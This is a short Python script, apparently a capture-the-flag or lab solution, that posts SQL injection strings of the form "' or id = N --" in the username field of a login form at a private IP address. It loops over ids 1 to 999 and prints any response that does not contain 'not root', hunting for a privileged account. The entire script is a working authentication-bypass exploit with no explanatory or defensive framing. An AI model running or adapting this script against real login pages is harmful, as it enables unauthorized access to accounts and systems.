import requests


url = "http://10.51.1.198:7631/login"


for i in range(1, 1000):
    injection_string = f"' or id = {i} --"
    data_form = {"username": injection_string}

    try:
        
        response = requests.post(url,
                             data=data_form)
    
        if "not root" not in response.text:
            print(response.text)
    except Exception as e:
        print(data_form, e.__str__)

